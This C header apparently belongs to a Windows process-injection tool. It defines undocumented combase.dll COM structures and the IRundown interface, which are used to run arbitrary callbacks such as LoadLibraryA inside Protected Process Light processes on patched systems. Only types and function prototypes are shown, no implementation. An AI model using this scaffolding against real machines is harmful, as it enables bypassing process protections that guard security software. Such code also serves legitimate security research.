#pragma once


#define OBJREF_SIGNATURE    ( 0x574f454d )
#define OBJREF_STANDARD     ( 0x1 )

// COM structures, most of the obtained from the following resources: 
// com_inject: https://github.com/mdsecactivebreach/com_inject/blob/b8243baa4f9eb8ea007686aca578a38c991f04fb/com_inject.h#L540
// OleViewDotNet: https://github.com/tyranid/oleviewdotnet

struct IPID {
    WORD offset;     // These are reversed because of little-endian
    WORD page;       // These are reversed because of little-endian

    WORD pid;
    WORD tid;

    BYTE seq[8];
};

struct tagPageEntry {
    tagPageEntry* pNext;
    unsigned int dwFlag;
};

struct CInternalPageAllocator {
    ULONG64            _cPages;
    tagPageEntry** _pPageListStart;
    tagPageEntry** _pPageListEnd;
    UINT               _dwFlags;
    tagPageEntry       _ListHead;
    UINT               _cEntries;
    ULONG64            _cbPerEntry;
    USHORT             _cEntriesPerPage;
    void* _pLock;
};

// CPageAllocator CIPIDTable::_palloc structure in combase.dll
struct CPageAllocator {
    CInternalPageAllocator _pgalloc;
    PVOID                  _hHeap;
    ULONG64                _cbPerEntry;
    INT                    _lNumEntries;
};

typedef struct tagIPIDEntry {
    struct tagIPIDEntry* pNextIPID;      // next IPIDEntry for same object
    DWORD                dwFlags;        // flags (see IPIDFLAGS)
    ULONG                cStrongRefs;    // strong reference count
    ULONG                cWeakRefs;      // weak reference count
    ULONG                cPrivateRefs;   // private reference count
    void* pv;             // real interface pointer
    IUnknown* pStub;          // proxy or stub pointer
    void* pOXIDEntry;     // ptr to OXIDEntry in OXID Table
    IPID                 ipid;           // interface pointer identifier
    IID                  iid;            // interface iid
    void* pChnl;          // channel pointer
    void* pIRCEntry;      // reference cache line
    HSTRING* pInterfaceName;
    struct tagIPIDEntry* pOIDFLink;      // In use OID list
    struct tagIPIDEntry* pOIDBLink;
} IPIDEntry;

// Placeholder for pointer types with unknown structures
typedef void* CListElementPtr;
typedef void* HWNDPtr;
typedef void* CComApartmentPtr;
typedef void* CChannelHandlePtr;
typedef void* MIDEntryPtr;
typedef void* IRemUnknownPtr;
typedef void* VoidPtr;

// In older versions of windows the structure looks like OXIDEntryOld
// Since this injection is "only" relevant in >=22h2 full patched systems, we could just skip it,
// because in older systems other PPL Injections such as PPLFault, PPLMedic, etc are relevant.
/*
typedef struct OXIDEntryOld {
    void* flink;
    void* blink;
    unsigned long dwPid;
    unsigned long dwTid;
    GUID moxid;
    unsigned __int64 mid;
    GUID ipidRundown;
    ULONG dwFlags;
    HWND* hServerSTA;
    void* pParentApt;
    void* pSharedDefaultHandle;
    void* pAuthId;
    void* pBinding;
    ULONG dwAuthnHint;
    ULONG _dwAuthnSvc;
    void* _pMIDEntry;
    void* _pRUSTA;
    ULONG _cRefs;
    void* _hComplete;
    long _cCalls;
    long _cResolverRef;
    ULONG _dwExpiredTime;
    USHORT version[2];
    void* _pAppContainerServerSecurityDescriptor;
    ULONG _ulMarshaledTargetInfoLength;
    void* _marshaledTargetInfo;
    void* _pszServerPackageFullName;
    GUID processIdentifier;

} OXIDEntryOld;
*/

// OXIDEntry structure in combase.dll

typedef struct OXIDEntry {
    CListElementPtr _flink;
    CListElementPtr _blink;
    bool m_isInList;
    char _info[0x98]; // Allocated space for _info field
    uint64_t _mid;
    GUID _ipidRundown;
    GUID moxid;
    int _registered; // int as a simple substitute for std::atomic<bool>
    int _stopped;
    int _pendingRelease;
    int _remotingInitialized;
    HWNDPtr _hServerSTA;
    CComApartmentPtr _pParentApt;
    CChannelHandlePtr _pSharedDefaultHandle;
    VoidPtr _pAuthId;
    uint32_t _dwAuthnSvc;
    MIDEntryPtr _pMIDEntry;
    IRemUnknownPtr _pRUSTA;
    uint32_t _cRefs;
    VoidPtr _hComplete;
    int32_t _cCalls;
    int32_t _cResolverRef;
    uint32_t _dwExpiredTime;
    VoidPtr _pAppContainerServerSecurityDescriptor;
    uint32_t _ulMarshaledTargetInfoLength;
    unsigned char* _marshaledTargetInfo; // Pointer to a byte array for marshaled target info
    int _clientDependencyEvaluated;
    struct OXIDEntry* _pPrimaryOxid; // Pointer to OXIDEntry, losing atomic property
} OXIDEntry;

struct tagCTXVERSION {
    SHORT ThisVersion;
    SHORT MinVersion;
};

struct tagCTXCOMMONHDR {
    GUID  ContextId;
    DWORD Flags;
    DWORD Reserved;
    DWORD dwNumExtents;
    DWORD cbExtents;
    DWORD MshlFlags;
};

struct tagBYREFHDR {
    DWORD Reserved;
    DWORD ProcessId;
    GUID  guidProcessSecret;
    PVOID pServerCtx;          // CObjectContext
};

struct tagBYVALHDR {
    ULONG         Count;
    BOOL          Frozen;
};

struct tagCONTEXTHEADER {
    tagCTXVERSION Version;
    tagCTXCOMMONHDR CmnHdr;

    union {
        tagBYVALHDR ByValHdr;
        tagBYREFHDR ByRefHdr;
    };
};

typedef struct tagDUALSTRINGARRAY
{
    unsigned short wNumEntries;
    unsigned short wSecurityOffset;
    /* [size_is] */ unsigned short aStringArray[1];
}   DUALSTRINGARRAY;

typedef struct tagDATAELEMENT
{
    GUID dataID;
    unsigned long cbSize;
    unsigned long cbRounded;
    /* [size_is] */ BYTE Data[1];
}   DATAELEMENT;

typedef struct tagOBJREFDATA
{
    unsigned long nElms;
    /* [unique][size_is][size_is] */ DATAELEMENT** ppElmArray;
}   OBJREFDATA;

typedef __int64 OXID;
typedef unsigned hyper OID;

typedef struct tagSTDOBJREF {
    ULONG flags;
    ULONG cPublicRefs;
    OXID  oxid;
    OID   oid;
    IPID  ipid;
} STDOBJREF;


typedef union _moxid {
    BYTE b[16];
    DWORD64 q[2];
} _moxid;

typedef struct tagOBJREF
{
    unsigned long signature;
    unsigned long flags;
    GUID iid;
    /* [switch_type][switch_is] */ union
    {
        /* [case()] */ struct
        {
            STDOBJREF std;
            DUALSTRINGARRAY saResAddr;
        }   u_standard;
        /* [case()] */ struct
        {
            STDOBJREF std;
            CLSID clsid;
            DUALSTRINGARRAY saResAddr;
        }   u_handler;
        /* [case()] */ struct
        {
            CLSID clsid;
            unsigned long cbExtension;
            unsigned long size;
            /* [ref][size_is] */ byte* pData;
        }   u_custom;
        /* [case()] */ struct
        {
            STDOBJREF std;
            /* [unique] */ OBJREFDATA* pORData;
            DUALSTRINGARRAY saResAddr;
        }   u_extended;
    }   u_objref;
}   OBJREF;

typedef struct tagREMQIRESULT {
    HRESULT hResult;
    STDOBJREF std;
} REMQIRESULT;

typedef struct tagREMINTERFACEREF {
    IPID ipid;
    ULONG cPublicRefs;
    ULONG cPrivateRefs;
} REMINTERFACEREF;

typedef __int64 PTRMEM;

typedef struct tagXAptCallback {
    PTRMEM    pfnCallback;          // what to execute. e.g. LoadLibraryA, EtwpCreateEtwThread
    PTRMEM    pParam;               // parameter to callback.
    PTRMEM    pServerCtx;           // combase!g_pMTAEmptyCtx
    PTRMEM    pUnk;                 // Not required
    GUID      iid;                  // Not required
    int       iMethod;              // Not required
    GUID      guidProcessSecret;    // combase!CProcessSecret::s_guidOle32Secret
} XAptCallback;

typedef REFGUID REFIPID;

typedef struct tagMInterfacePointer {
    ULONG ulCntData;
    BYTE abData[1];
} MInterfacePointer;

typedef MInterfacePointer* PMInterfacePointer;

// IID of IMarshalEnvoy
static const IID
IID_IMarshalEnvoy = {
    0x000001C8,
    0x0000,
    0x0000,
    {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46} };

MIDL_INTERFACE("000001C8-0000-0000-C000-000000000046")
IMarshalEnvoy : public IUnknown{
    // IMarshalEnvoy
    STDMETHOD(GetEnvoyUnmarshalClass)(DWORD dwDestContext, CLSID * pclsid);
    STDMETHOD(GetEnvoySizeMax)       (DWORD dwDestContext, DWORD* pcb);
    STDMETHOD(MarshalEnvoy)          (IStream* pstm, DWORD dwDestContext);
    STDMETHOD(UnmarshalEnvoy)        (IStream* pstm, REFIID riid, void** ppv);
};

// IID of IRundown
static const IID IID_IRundown = {
    0x00000134,
    0x0000,
    0x0000,
    {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46} };

MIDL_INTERFACE("00000134-0000-0000-C000-000000000046")
IRundown : public IUnknown{
    STDMETHOD(RemQueryInterface)         (REFIPID ripid, ULONG cRefs, USHORT cIids, IID * iids, REMQIRESULT * *ppQIResults);
    STDMETHOD(RemAddRef)                 (USHORT cInterfaceRefs, REMINTERFACEREF InterfaceRefs[], HRESULT* pResults);
    STDMETHOD(RemRelease)                (USHORT cInterfaceRefs, REMINTERFACEREF InterfaceRefs[]);
    STDMETHOD(RemQueryInterface2)        (REFIPID ripid, USHORT cIids, IID* piids, HRESULT* phr, MInterfacePointer** ppMIFs);
    STDMETHOD(AcknowledgeMarshalingSets) (USHORT cMarshalingSets, ULONG_PTR* pMarshalingSets);
    STDMETHOD(RemChangeRef)              (ULONG flags, USHORT cInterfaceRefs, REMINTERFACEREF InterfaceRefs[]);
    STDMETHOD(DoCallback)                (XAptCallback* pParam);
    STDMETHOD(DoNonreentrantCallback)    (XAptCallback* pParam);
    STDMETHOD(GetInterfaceNameFromIPID)  (IPID* ipid, HSTRING* Name);
    STDMETHOD(RundownOid)                (ULONG cOid, OID aOid[], BYTE aRundownStatus[]);
};

typedef struct _DEBUG_INTERFACES {
    BOOL initialized;
    IDebugClient* pDebugClient;
    IDebugAdvanced* pDebugAdvanced;
    IDebugControl3* pDebugControl;
    IDebugDataSpaces* pDebugDataSpaces;
} DEBUG_INTERFACES, * PDEBUG_INTERFACES;

typedef struct _LOCAL_COM_OFFSETS {
    ULONGLONG DoCallbackSecretGuid;
    ULONGLONG DoCallbackServerCtx;
    ULONG64 IpidTable;
} LOCAL_COM_OFFSETS, * PLOCAL_COM_OFFSETS;

typedef struct _IR_PARAMETERS {
    GUID secretGUID;
    IPID myIPID;
    union _moxid {
        BYTE b[16];
        DWORD64 q[2];
    } _moxid;
    void* pContext;
} IR_PARAMETERS, * PIR_PARAMETERS;

bool
GetLocalComOffsets(
    _Inout_ PLOCAL_COM_OFFSETS pOffsets);

bool
DumpInitializeUtils(
    _In_ PCSTR DumpFile);

static
BOOL
DumpGetIIDEntry(
    _In_ IID iid,
    _In_ ULONG64 PageAllocator,
    _Out_ IPIDEntry* OutEntry);

BOOL
DumpGetIRundownParameters(
    _Out_ PIR_PARAMETERS pParam);

BOOL
DumpGetRemoteSection(
    _In_ PVOID pPattern,
    _In_ ULONG szPattern,
    _Out_ PVOID* pRemoteSection);

void*
IRundownConnect(_In_ PIR_PARAMETERS pRundownParams);
